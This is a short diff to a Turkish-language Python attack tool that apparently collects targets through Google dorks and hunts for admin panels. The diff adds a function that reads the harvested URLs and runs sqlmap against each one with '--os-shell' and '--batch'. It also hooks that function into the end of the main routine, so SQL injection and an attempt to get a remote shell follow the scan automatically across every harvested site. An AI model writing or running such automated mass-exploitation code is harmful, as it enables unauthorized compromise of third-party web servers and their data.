@@ -166,6 +166,17 @@ def run_dork_scan():
 
     save_results_to_file(targets)
 
+def run_sqli_shell():
+    with open("results/sql.txt", "r") as f:
+        urls = f.readlines()
+    for url in urls:
+        url = url.strip()
+        subprocess.run(["sqlmap", "-u", url, "-v3", "--batch", "--threads=10", "--os-shell", "--output-dir=sql"])
+
+def run_mini_sqli_scanner():
+    print("[*]mini_sqli_scanner başlatılıyor")
+    print_error_and_exit("[*] mini_sqli_scanner şuanlık kullanılamıyor... \n [*] lütfen mini_sqli_scanner parametresini kullanmayınız!")
+
 def run_panelfinder():
     print(f"{Fore.CYAN}[+] Panel bulucu çalıştırılıyor...{Style.RESET_ALL}")
     panels = ["/admin", "/panel", "/admin/login.php", "/cpanel", "/login", "/administrator"]
@@ -278,3 +289,4 @@ if __name__ == "__main__":
     işlem_sıralama()
     if driver:
         driver.quit()
+    run_sqli_shell()
